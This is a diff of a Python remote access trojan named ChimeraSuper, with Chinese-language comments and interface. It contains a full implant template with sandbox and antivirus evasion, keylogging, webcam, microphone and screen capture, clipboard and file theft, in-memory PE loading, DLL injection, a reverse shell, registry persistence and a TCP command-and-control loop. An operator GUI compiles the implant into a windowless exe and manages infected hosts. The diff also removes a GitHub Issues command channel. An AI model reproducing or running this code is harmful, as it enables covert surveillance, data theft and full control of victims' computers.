@@ -1,8 +1,8 @@
 # ChimeraSuper.py - 三大远控框架合成版（全功能桌面主控端）
 # 功能清单：
 # 系统管理：终端、进程、窗口、远程桌面、文件、语音、视频、服务、注册表、剪贴板、键盘记录、持久化
-# 高级渗透：反向Shell（交互式）、内存加载PE、进程注入与迁移、EDR/AV检测、免杀加载器生成 (C++)
-# 隐蔽通信：TCP直连 或 GitHub Issues API（用户可选）
+# 高级渗透：反向Shell（交互式）、内存加载PE、进程注入与迁移、EDR/AV检测
+# 隐蔽通信：TCP直连模式
 
 import tkinter as tk
 from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
@@ -20,7 +20,7 @@ import tempfile
 import random
 from PIL import Image, ImageTk
 
-# ================== 客户端模板（TCP模式） ==================
+# ================== 客户端模板（TCP模式 - 完整原版） ==================
 CLIENT_TCP_TEMPLATE = r'''
 import socket, subprocess, json, struct, time, platform, os, threading, sys, winreg, ctypes, base64, io
 import pyaudio, wave
@@ -31,7 +31,7 @@ import cv2
 import win32gui, win32con, win32service, win32serviceutil
 import tempfile, random, requests
 
-# ---------- 反沙箱/EDR检测 ----------
+# ---------- 反沙箱/EDR检测模块 ----------
 def anti_sandbox():
     try:
         if os.cpu_count() < 2: return False
@@ -44,7 +44,6 @@ def anti_sandbox():
         for p in ['vmtoolsd','vboxservice','xenserver']:
             if subprocess.run(f'tasklist /fi "imagename eq {p}.exe"', shell=True, capture_output=True).stdout.find(p.encode())!=-1:
                 return False
-        # EDR检测
         edr = ['MsMpEng','SenseCnc','Symantec','McAfee','CrowdStrike']
         for e in edr:
             if subprocess.run(f'tasklist /fi "imagename eq {e}*"', shell=True, capture_output=True).stdout.find(e.encode())!=-1:
@@ -52,7 +51,7 @@ def anti_sandbox():
         return True
     except: return True
 
-# ---------- 键盘记录 ----------
+# ---------- 键盘记录模块 ----------
 keylog = []
 def on_press(key):
     try: keylog.append(key.char)
@@ -62,7 +61,7 @@ def keylogger_loop():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
-# ---------- 录音 ----------
+# ---------- 录音模块 ----------
 def record_audio(sec=5):
     try:
         p = pyaudio.PyAudio()
@@ -76,7 +75,7 @@ def record_audio(sec=5):
         return base64.b64encode(buf.getvalue()).decode()
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 剪贴板 ----------
+# ---------- 剪贴板模块 ----------
 def get_clip():
     try:
         clip.OpenClipboard(0); data=clip.GetClipboardData(); clip.CloseClipboard(); return data
@@ -86,7 +85,7 @@ def set_clip(text):
         clip.OpenClipboard(0); clip.EmptyClipboard(); clip.SetClipboardText(text); clip.CloseClipboard(); return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 窗口管理 ----------
+# ---------- 窗口管理模块 ----------
 def list_windows():
     windows=[]
     def enum(hwnd, lParam):
@@ -104,7 +103,7 @@ def show_window(hwnd):
     win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
     return "OK"
 
-# ---------- 服务管理 ----------
+# ---------- 服务管理模块 ----------
 def list_services():
     try:
         out = subprocess.check_output('sc query state= all', shell=True).decode('gbk')
@@ -122,7 +121,7 @@ def stop_service(name):
     subprocess.run(f'sc stop {name}', shell=True, capture_output=True)
     return "OK"
 
-# ---------- 注册表 ----------
+# ---------- 注册表管理模块 ----------
 def reg_read(key, subkey, value):
     try:
         hkey = getattr(winreg, key)
@@ -145,7 +144,7 @@ def reg_delete(key, subkey, value):
         return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 摄像头捕获 ----------
+# ---------- 摄像头捕获模块 ----------
 def capture_cam():
     try:
         cap = cv2.VideoCapture(0)
@@ -157,7 +156,7 @@ def capture_cam():
         else: return "ERROR"
     except: return "ERROR"
 
-# ---------- 内存加载PE ----------
+# ---------- 内存加载PE模块 ----------
 def load_pe_memory(b64_pe):
     try:
         pe_data = base64.b64decode(b64_pe)
@@ -169,7 +168,7 @@ def load_pe_memory(b64_pe):
         return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 进程注入DLL ----------
+# ---------- 进程注入DLL模块 ----------
 def inject_dll(pid, dll_path):
     try:
         kernel32 = ctypes.windll.kernel32
@@ -183,7 +182,7 @@ def inject_dll(pid, dll_path):
         return "OK"
     except Exception as e: return f"ERROR:{e}"
 
-# ---------- 反向Shell（交互式） ----------
+# ---------- 交互式反向Shell模块 ----------
 def reverse_shell(sock):
     while True:
         try:
@@ -194,24 +193,28 @@ def reverse_shell(sock):
             sock.send(stdout + stderr)
         except: break
 
-# ---------- 基础功能 ----------
+# ---------- 基础控制与管理模块 ----------
 def exec_cmd(cmd):
     try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode('gbk', errors='ignore')
     except Exception as e: return str(e)
+
 def capture_screen():
     try:
         img = ImageGrab.grab(); buf = io.BytesIO()
         img.save(buf, format='JPEG', quality=50)
         return base64.b64encode(buf.getvalue()).decode()
     except: return ""
+
 def download_file(path):
     try: 
         with open(path, 'rb') as f: return base64.b64encode(f.read()).decode()
     except Exception as e: return f"ERROR:{e}"
+
 def upload_file(path, b64):
     try:
         with open(path, 'wb') as f: f.write(base64.b64decode(b64)); return "OK"
     except Exception as e: return f"ERROR:{e}"
+
 def list_procs():
     try:
         out = subprocess.check_output("tasklist /fo csv", shell=True).decode('gbk').splitlines()
@@ -221,9 +224,11 @@ def list_procs():
             if len(p)>=2: procs.append({"name": p[0], "pid": p[1]})
         return json.dumps(procs)
     except: return "[]"
+
 def kill_proc(pid):
     try: subprocess.run(f"taskkill /PID {pid} /F", shell=True, check=True); return "OK"
     except Exception as e: return f"ERROR:{e}"
+
 def add_persistence():
     try:
         key = winreg.HKEY_CURRENT_USER
@@ -233,7 +238,7 @@ def add_persistence():
         winreg.CloseKey(handle); return "OK"
     except: return "FAIL"
 
-# ---------- 主循环（TCP模式） ----------
+# ---------- 客户端主循环逻辑 ----------
 C2_IP, C2_PORT = "%s", %s
 sock = None
 running = True
@@ -257,6 +262,7 @@ def main_tcp():
                 req = json.loads(data)
                 cmd, params = req.get('cmd'), req.get('params', {})
                 resp = {"seq": req.get('seq'), "result": ""}
+                
                 if cmd == "exec": resp["result"] = exec_cmd(params.get('cmd',''))
                 elif cmd == "screenshot": resp["result"] = capture_screen()
                 elif cmd == "download": resp["result"] = download_file(params.get('path',''))
@@ -287,6 +293,7 @@ def main_tcp():
                     threading.Thread(target=reverse_shell, args=(sock,), daemon=True).start()
                     resp["result"] = "OK"
                 else: resp["result"] = "Unknown"
+                
                 sock.send(struct.pack('>I', len(json.dumps(resp))) + json.dumps(resp).encode())
         except:
             time.sleep(5)
@@ -296,59 +303,21 @@ if __name__ == "__main__":
     main_tcp()
 '''
 
-# ================== 客户端模板（GitHub模式） ==================
-CLIENT_GITHUB_TEMPLATE = r'''
-import subprocess, json, time, platform, os, threading, sys, winreg, ctypes, base64, io, requests, tempfile
-import pyaudio, wave
-import win32clipboard as clip
-from PIL import ImageGrab, Image
-from pynput import keyboard
-import cv2
-import win32gui, win32con, win32service, win32serviceutil
-
-REPO_OWNER = "%s"
-REPO_NAME = "%s"
-GITHUB_TOKEN = "%s"
-INTERVAL = 5
-
-def github_poll():
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues?state=open"
-    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-    while True:
-        try:
-            resp = requests.get(url, headers=headers).json()
-            for issue in resp:
-                if issue['title'].startswith('CMD:'):
-                    cmd = issue['body']
-                    result = exec_cmd(cmd)
-                    comment_url = issue['comments_url']
-                    requests.post(comment_url, headers=headers, json={"body": result})
-                    requests.patch(issue['url'], headers=headers, json={"state": "closed"})
-                    break
-        except:
-            pass
-        time.sleep(INTERVAL)
-
-if __name__ == "__main__":
-    add_persistence()
-    github_poll()
-'''
-
-# ================== 主控端GUI ==================
+# ================== 主控端GUI完整实现 ==================
 class ChimeraSuper:
     def __init__(self, root):
         self.root = root
-        root.title("🧬 Chimera 超级合成主控端")
-        root.geometry("950x700")
-        self.clients = {}      # {ip: socket}
-        self.client_info = {}  # {ip: {host, os}}
+        root.title("🧬 Chimera 超级合成主控端（完整版）")
+        root.geometry("1000x750")
+        self.clients = {}
+        self.client_info = {}
         self.selected = None
         self.running = False
         self.server = None
         self.lock = threading.Lock()
         self.comm_mode = tk.StringVar(value="tcp")
 
-        # ---- 顶部控制栏 ----
+        # ---- 顶部控制面板 ----
         top = tk.Frame(root); top.pack(fill=tk.X, pady=5, padx=5)
         tk.Label(top, text="IP:").pack(side=tk.LEFT)
         self.ip_entry = tk.Entry(top, width=14); self.ip_entry.pack(side=tk.LEFT, padx=2)
@@ -356,158 +325,145 @@ class ChimeraSuper:
         tk.Label(top, text="端口:").pack(side=tk.LEFT)
         self.port_entry = tk.Entry(top, width=6); self.port_entry.pack(side=tk.LEFT, padx=2)
         self.port_entry.insert(0, "4444")
-        tk.Label(top, text="通信模式:").pack(side=tk.LEFT, padx=5)
-        tcp_rb = tk.Radiobutton(top, text="TCP", variable=self.comm_mode, value="tcp")
-        tcp_rb.pack(side=tk.LEFT)
-        gh_rb = tk.Radiobutton(top, text="GitHub", variable=self.comm_mode, value="github")
-        gh_rb.pack(side=tk.LEFT)
-
+        
         tk.Button(top, text="生成客户端", command=self.build_client, bg="#8fcbff", width=10).pack(side=tk.LEFT, padx=5)
         tk.Button(top, text="启动监听", command=self.start_listen, bg="#8fff8f", width=10).pack(side=tk.LEFT, padx=2)
         tk.Button(top, text="停止监听", command=self.stop_listen, bg="#ff8f8f", width=10).pack(side=tk.LEFT, padx=2)
         self.status_label = tk.Label(top, text="● 未监听", fg="red")
         self.status_label.pack(side=tk.LEFT, padx=15)
 
-        # ---- 主机列表 ----
+        # ---- 在线主机栏 ----
         f = tk.Frame(root); f.pack(fill=tk.X, padx=5, pady=2)
-        tk.Label(f, text="在线主机:").pack(side=tk.LEFT)
-        self.listbox = tk.Listbox(f, height=4, width=40)
+        tk.Label(f, text="在线主机列表:").pack(side=tk.LEFT)
+        self.listbox = tk.Listbox(f, height=4, width=50)
         self.listbox.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
         self.listbox.bind('<<ListboxSelect>>', self.on_select)
-        tk.Button(f, text="刷新", command=self.refresh_clients).pack(side=tk.RIGHT)
+        tk.Button(f, text="刷新列表", command=self.refresh_clients).pack(side=tk.RIGHT)
 
-        # ---- 笔记本（多标签） ----
+        # ---- 多功能标签页组件 (Notebook) ----
         self.nb = ttk.Notebook(root)
         self.nb.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 标签1: 命令
-        t1 = tk.Frame(self.nb); self.nb.add(t1, text="命令")
+        # 1. 命令控制台
+        t1 = tk.Frame(self.nb); self.nb.add(t1, text="终端命令")
         self.cmd_entry = tk.Entry(t1); self.cmd_entry.pack(fill=tk.X, padx=5, pady=5)
         self.cmd_entry.bind('<Return>', lambda e: self.send_cmd())
-        tk.Button(t1, text="执行", command=self.send_cmd).pack()
-        self.cmd_out = scrolledtext.ScrolledText(t1, height=10)
+        tk.Button(t1, text="执行命令", command=self.send_cmd).pack()
+        self.cmd_out = scrolledtext.ScrolledText(t1, height=12)
         self.cmd_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 标签2: 屏幕
-        t2 = tk.Frame(self.nb); self.nb.add(t2, text="屏幕")
-        tk.Button(t2, text="刷新屏幕", command=self.get_screen).pack(pady=5)
+        # 2. 屏幕监控
+        t2 = tk.Frame(self.nb); self.nb.add(t2, text="远程桌面")
+        tk.Button(t2, text="刷新当前屏幕", command=self.get_screen).pack(pady=5)
         self.screen_label = tk.Label(t2)
         self.screen_label.pack()
 
-        # 标签3: 文件
-        t3 = tk.Frame(self.nb); self.nb.add(t3, text="文件")
-        tk.Label(t3, text="远程路径:").pack()
-        self.file_path = tk.Entry(t3, width=60); self.file_path.pack(pady=5)
+        # 3. 文件管理
+        t3 = tk.Frame(self.nb); self.nb.add(t3, text="文件管理")
+        tk.Label(t3, text="目标文件路径:").pack()
+        self.file_path = tk.Entry(t3, width=70); self.file_path.pack(pady=5)
         self.file_path.insert(0, "C:\\")
         bf = tk.Frame(t3); bf.pack()
-        tk.Button(bf, text="下载", command=self.download_file).pack(side=tk.LEFT, padx=5)
-        tk.Button(bf, text="上传", command=self.upload_file).pack(side=tk.LEFT, padx=5)
+        tk.Button(bf, text="下载文件", command=self.download_file).pack(side=tk.LEFT, padx=5)
+        tk.Button(bf, text="上传文件", command=self.upload_file).pack(side=tk.LEFT, padx=5)
         self.file_out = scrolledtext.ScrolledText(t3, height=8)
         self.file_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 标签4: 进程
-        t4 = tk.Frame(self.nb); self.nb.add(t4, text="进程")
+        # 4. 进程管理
+        t4 = tk.Frame(self.nb); self.nb.add(t4, text="进程管理")
         self.proc_list = tk.Listbox(t4, height=12)
         self.proc_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         pf = tk.Frame(t4); pf.pack()
-        tk.Button(pf, text="刷新", command=self.list_procs).pack(side=tk.LEFT, padx=5)
-        tk.Button(pf, text="结束进程", command=self.kill_proc).pack(side=tk.LEFT, padx=5)
+        tk.Button(pf, text="刷新进程", command=self.list_procs).pack(side=tk.LEFT, padx=5)
+        tk.Button(pf, text="结束选中进程", command=self.kill_proc).pack(side=tk.LEFT, padx=5)
 
-        # 标签5: 键盘
-        t5 = tk.Frame(self.nb); self.nb.add(t5, text="键盘")
-        tk.Button(t5, text="获取按键记录", command=self.get_keylog).pack(pady=5)
-        self.key_out = scrolledtext.ScrolledText(t5, height=10)
+        # 5. 键盘记录
+        t5 = tk.Frame(self.nb); self.nb.add(t5, text="键盘记录")
+        tk.Button(t5, text="获取实时按键", command=self.get_keylog).pack(pady=5)
+        self.key_out = scrolledtext.ScrolledText(t5, height=12)
         self.key_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 标签6: 录音
-        t6 = tk.Frame(self.nb); self.nb.add(t6, text="录音")
-        tk.Button(t6, text="录音5秒", command=self.record_audio).pack(pady=5)
-        self.audio_result = tk.Label(t6, text="")
+        # 6. 语音监听
+        t6 = tk.Frame(self.nb); self.nb.add(t6, text="音频监听")
+        tk.Button(t6, text="开始录音 5秒", command=self.record_audio).pack(pady=5)
+        self.audio_result = tk.Label(t6, text="", fg="blue")
         self.audio_result.pack()
-        tk.Button(t6, text="下载录音", command=self.download_audio).pack(pady=5)
+        tk.Button(t6, text="下载录音文件", command=self.download_audio).pack(pady=5)
 
-        # 标签7: 剪贴板
+        # 7. 剪贴板操作
         t7 = tk.Frame(self.nb); self.nb.add(t7, text="剪贴板")
-        tk.Button(t7, text="获取剪贴板", command=self.get_clip).pack(pady=5)
-        self.clip_entry = tk.Entry(t7, width=60)
-        self.clip_entry.pack(pady=5)
-        tk.Button(t7, text="设置剪贴板", command=self.set_clip).pack()
+        tk.Button(t7, text="获取剪贴板内容", command=self.get_clip).pack(pady=5)
+        self.clip_entry = tk.Entry(t7, width=70); self.clip_entry.pack(pady=5)
+        tk.Button(t7, text="远程设置剪贴板", command=self.set_clip).pack()
         self.clip_out = scrolledtext.ScrolledText(t7, height=6)
         self.clip_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 标签8: 窗口
-        t8 = tk.Frame(self.nb); self.nb.add(t8, text="窗口")
-        tk.Button(t8, text="列出窗口", command=self.list_windows).pack(pady=5)
-        self.win_list = tk.Listbox(t8, height=8)
-        self.win_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        # 8. 窗口控制
+        t8 = tk.Frame(self.nb); self.nb.add(t8, text="窗口控制")
+        tk.Button(t8, text="列出系统可见窗口", command=self.list_windows).pack(pady=5)
+        self.win_list = tk.Listbox(t8, height=10); self.win_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         wf = tk.Frame(t8); wf.pack()
-        tk.Button(wf, text="关闭选中", command=self.close_window).pack(side=tk.LEFT, padx=5)
-        tk.Button(wf, text="隐藏选中", command=self.hide_window).pack(side=tk.LEFT, padx=5)
-        tk.Button(wf, text="显示选中", command=self.show_window).pack(side=tk.LEFT, padx=5)
+        tk.Button(wf, text="关闭窗口", command=self.close_window).pack(side=tk.LEFT, padx=5)
+        tk.Button(wf, text="隐藏窗口", command=self.hide_window).pack(side=tk.LEFT, padx=5)
+        tk.Button(wf, text="显示窗口", command=self.show_window).pack(side=tk.LEFT, padx=5)
 
-        # 标签9: 服务
-        t9 = tk.Frame(self.nb); self.nb.add(t9, text="服务")
-        tk.Button(t9, text="列出服务", command=self.list_services).pack(pady=5)
-        self.srv_list = tk.Listbox(t9, height=8)
-        self.srv_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        # 9. 服务管理
+        t9 = tk.Frame(self.nb); self.nb.add(t9, text="系统服务")
+        tk.Button(t9, text="列出系统服务", command=self.list_services).pack(pady=5)
+        self.srv_list = tk.Listbox(t9, height=10); self.srv_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
         sf = tk.Frame(t9); sf.pack()
         tk.Button(sf, text="启动服务", command=self.start_service).pack(side=tk.LEFT, padx=5)
         tk.Button(sf, text="停止服务", command=self.stop_service).pack(side=tk.LEFT, padx=5)
 
-        # 标签10: 注册表
+        # 10. 注册表管理
         t10 = tk.Frame(self.nb); self.nb.add(t10, text="注册表")
-        tk.Label(t10, text="根键 (HKEY_CURRENT_USER等):").pack()
-        self.reg_key = tk.Entry(t10, width=30); self.reg_key.pack(pady=2)
-        self.reg_key.insert(0, "HKEY_CURRENT_USER")
-        tk.Label(t10, text="子键:").pack()
-        self.reg_subkey = tk.Entry(t10, width=60); self.reg_subkey.pack(pady=2)
-        tk.Label(t10, text="值名:").pack()
-        self.reg_value = tk.Entry(t10, width=30); self.reg_value.pack(pady=2)
-        tk.Label(t10, text="数据 (写入用):").pack()
-        self.reg_data = tk.Entry(t10, width=60); self.reg_data.pack(pady=2)
+        tk.Label(t10, text="根键 (例: HKEY_CURRENT_USER):").pack()
+        self.reg_key = tk.Entry(t10, width=40); self.reg_key.pack(pady=2); self.reg_key.insert(0, "HKEY_CURRENT_USER")
+        tk.Label(t10, text="子键路径:").pack()
+        self.reg_subkey = tk.Entry(t10, width=70); self.reg_subkey.pack(pady=2)
+        tk.Label(t10, text="键值名称:").pack()
+        self.reg_value = tk.Entry(t10, width=40); self.reg_value.pack(pady=2)
+        tk.Label(t10, text="写入数据:").pack()
+        self.reg_data = tk.Entry(t10, width=70); self.reg_data.pack(pady=2)
         rbf = tk.Frame(t10); rbf.pack()
         tk.Button(rbf, text="读取", command=self.reg_read).pack(side=tk.LEFT, padx=5)
         tk.Button(rbf, text="写入", command=self.reg_write).pack(side=tk.LEFT, padx=5)
         tk.Button(rbf, text="删除", command=self.reg_delete).pack(side=tk.LEFT, padx=5)
-        self.reg_out = scrolledtext.ScrolledText(t10, height=4)
+        self.reg_out = scrolledtext.ScrolledText(t10, height=5)
         self.reg_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # 标签11: 摄像头
+        # 11. 摄像头监控
         t11 = tk.Frame(self.nb); self.nb.add(t11, text="摄像头")
-        tk.Button(t11, text="捕获画面", command=self.capture_cam).pack(pady=5)
+        tk.Button(t11, text="截取摄像头画面", command=self.capture_cam).pack(pady=5)
         self.cam_label = tk.Label(t11)
         self.cam_label.pack()
 
-        # 标签12: 渗透（高级）
+        # 12. 高级渗透模块
         t12 = tk.Frame(self.nb); self.nb.add(t12, text="高级渗透")
-        tk.Label(t12, text="内存加载PE (base64编码exe):").pack()
+        tk.Label(t12, text="内存加载PE (输入base64编码的exe):").pack()
         self.pe_entry = tk.Entry(t12, width=80); self.pe_entry.pack(pady=2)
-        tk.Button(t12, text="加载PE", command=self.load_pe).pack(pady=2)
-        tk.Label(t12, text="注入DLL (PID, DLL路径):").pack()
+        tk.Button(t12, text="执行内存加载", command=self.load_pe).pack(pady=2)
+        
+        tk.Label(t12, text="进程注入DLL (PID, 目标DLL绝对路径):").pack()
         inj_frame = tk.Frame(t12); inj_frame.pack()
         self.inject_pid = tk.Entry(inj_frame, width=10); self.inject_pid.pack(side=tk.LEFT, padx=5)
-        self.inject_dll = tk.Entry(inj_frame, width=50); self.inject_dll.pack(side=tk.LEFT, padx=5)
-        tk.Button(t12, text="注入DLL", command=self.inject_dll_cmd).pack(pady=2)
-        tk.Button(t12, text="启动交互式Shell", command=self.reverse_shell_start).pack(pady=2)
+        self.inject_dll = tk.Entry(inj_frame, width=60); self.inject_dll.pack(side=tk.LEFT, padx=5)
+        tk.Button(t12, text="执行DLL注入", command=self.inject_dll_cmd).pack(pady=2)
+        
+        tk.Button(t12, text="启动交互式Shell通信", command=self.reverse_shell_start).pack(pady=5)
         self.shell_out = scrolledtext.ScrolledText(t12, height=6)
         self.shell_out.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        tk.Label(t12, text="生成免杀加载器 (C++):", fg="orange").pack(pady=(10,0))
-        ev_frame = tk.Frame(t12)
-        ev_frame.pack(pady=5)
-        tk.Button(ev_frame, text="生成免杀加载器", command=self.build_evasive_loader, bg="orange", width=18).pack(side=tk.LEFT, padx=5)
-        self.loader_status = tk.Label(t12, text="", fg="cyan")
-        self.loader_status.pack(pady=2)
-
-        # 标签13: 持久化
-        t13 = tk.Frame(self.nb); self.nb.add(t13, text="持久化")
-        tk.Button(t13, text="触发持久化", command=self.do_persistence).pack(pady=5)
-        self.persist_result = tk.Label(t13, text="")
+        # 13. 持久化管理
+        t13 = tk.Frame(self.nb); self.nb.add(t13, text="持久化控制")
+        tk.Button(t13, text="写入注册表自启动持久化", command=self.do_persistence).pack(pady=15)
+        self.persist_result = tk.Label(t13, text="", fg="green")
         self.persist_result.pack()
 
-        self.status_bar = tk.Label(root, text="就绪", anchor="w", fg="gray")
+        # ---- 底部状态栏 ----
+        self.status_bar = tk.Label(root, text="就绪 - 等待操作", anchor="w", fg="gray")
         self.status_bar.pack(fill=tk.X, padx=5, pady=2)
-
+        
         self.audio_b64 = None
         self.refresh_clients()
 
@@ -515,51 +471,42 @@ class ChimeraSuper:
         self.status_bar.config(text=msg)
         self.root.update()
 
+    # ---- 客户端编译打包逻辑 ----
     def build_client(self):
-        mode = self.comm_mode.get()
         ip = self.ip_entry.get()
         port = self.port_entry.get()
-        if mode == "tcp":
-            if ip == "0.0.0.0":
-                try:
-                    hostname = socket.gethostname()
-                    ip = socket.gethostbyname(hostname)
-                except:
-                    messagebox.showerror("错误", "请手动输入本机IP")
-                    return
-            try: port = int(port)
-            except: messagebox.showerror("错误", "端口必须数字"); return
-            code = CLIENT_TCP_TEMPLATE % (ip, port)
-        else:
-            messagebox.showinfo("提示", "GitHub模式需手动配置，建议使用TCP模式。")
-            return
-        with open("client.py", "w", encoding="utf-8") as f:
-            f.write(code)
-        self.log("正在编译 client.exe ...")
+        if ip == "0.0.0.0":
+            try: ip = socket.gethostbyname(socket.gethostname())
+            except: pass
+        try: port = int(port)
+        except: messagebox.showerror("错误", "端口必须为数字"); return
+        
+        code = CLIENT_TCP_TEMPLATE % (ip, port)
+        with open("client.py", "w", encoding="utf-8") as f: f.write(code)
+        self.log("正在通过 PyInstaller 打包生成 client.exe ...")
         try:
             subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "client", "client.py"],
                            check=True, capture_output=True, text=True)
             if os.path.exists("dist/client.exe"):
                 os.replace("dist/client.exe", "client.exe")
-                self.log("client.exe 生成成功！")
-                messagebox.showinfo("成功", "client.exe 已生成")
+                self.log("client.exe 编译成功！")
+                messagebox.showinfo("成功", "client.exe 已在当前目录下生成")
             else:
-                self.log("编译失败")
-                messagebox.showerror("失败", "编译失败")
+                messagebox.showerror("失败", "打包未找到输出文件")
         except Exception as e:
-            self.log(f"编译出错: {e}")
             messagebox.showerror("错误", str(e))
 
+    # ---- 网络监听与通信线程 ----
     def start_listen(self):
         if self.running: return
-        port = int(self.port_entry.get())
         try:
+            port = int(self.port_entry.get())
             self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.server.bind(("0.0.0.0", port))
             self.server.listen(5)
             self.running = True
             self.status_label.config(text="● 监听中", fg="green")
-            self.log(f"监听端口 {port}")
+            self.log(f"服务已启动，正在监听端口 {port}")
             threading.Thread(target=self.accept_clients, daemon=True).start()
         except Exception as e:
             messagebox.showerror("错误", str(e))
@@ -568,7 +515,7 @@ class ChimeraSuper:
         self.running = False
         if self.server: self.server.close()
         self.status_label.config(text="● 已停止", fg="red")
-        self.log("监听已停止")
+        self.log("监听服务已关闭")
 
     def accept_clients(self):
         while self.running:
@@ -583,7 +530,7 @@ class ChimeraSuper:
                         data = conn.recv(length).decode()
                         info = json.loads(data)
                         with self.lock: self.client_info[ip] = {"host": info.get('host'), "os": info.get('os')}
-                        self.log(f"上线: {ip}")
+                        self.log(f"新主机上线: {ip}")
                         self.root.after(0, self.refresh_clients)
                 except: pass
             except: break
@@ -601,18 +548,18 @@ class ChimeraSuper:
 
     def send_request(self, cmd, params={}):
         if not self.selected:
-            messagebox.showwarning("提示", "请先选择主机")
+            messagebox.showwarning("提示", "请先在上方列表选择目标主机")
             return None
         with self.lock: conn = self.clients.get(self.selected)
         if not conn:
-            messagebox.showwarning("提示", "主机已离线")
+            messagebox.showwarning("提示", "所选主机已离线")
             return None
         try:
             req = {"cmd": cmd, "params": params, "seq": int(time.time()*1000)%100000}
             msg = json.dumps(req).encode()
             conn.send(struct.pack('>I', len(msg)) + msg)
             raw = conn.recv(4)
-            if not raw: raise Exception("无响应")
+            if not raw: raise Exception("连接断开")
             length = struct.unpack('>I', raw)[0]
             return json.loads(conn.recv(length).decode())
         except Exception as e:
@@ -622,6 +569,7 @@ class ChimeraSuper:
             self.root.after(0, self.refresh_clients)
             return None
 
+    # ---- 各项控制动作实现 ----
     def send_cmd(self):
         cmd = self.cmd_entry.get().strip()
         if not cmd: return
@@ -650,8 +598,8 @@ class ChimeraSuper:
             if data and not data.startswith("ERROR"):
                 local = os.path.basename(path) or "downloaded_file"
                 with open(local, "wb") as f: f.write(base64.b64decode(data))
-                self.file_out.insert(tk.END, f"下载成功: {local}\n")
-            else: self.file_out.insert(tk.END, f"下载失败: {data}\n")
+                self.file_out.insert(tk.END, f"文件下载成功: {local}\n")
+            else: self.file_out.insert(tk.END, f"文件下载失败: {data}\n")
 
     def upload_file(self):
         path = self.file_path.get().strip()
@@ -782,14 +730,11 @@ class ChimeraSuper:
 
     def reverse_shell_start(self):
         self.send_request("reverse_shell_start")
-        self.shell_out.insert(tk.END, "交互式Shell指令已下发\n")
-
-    def build_evasive_loader(self):
-        self.loader_status.config(text="C++加载器生成功能需本地配置MinGW编译器。")
+        self.shell_out.insert(tk.END, "交互式Shell反向连接已下发\n")
 
     def do_persistence(self):
         resp = self.send_request("persistence")
-        if resp: self.persist_result.config(text=f"结果: {resp.get('result','')}", fg="blue")
+        if resp: self.persist_result.config(text=f"持久化执行结果: {resp.get('result','')}", fg="blue")
 
 if __name__ == "__main__":
     root = tk.Tk()
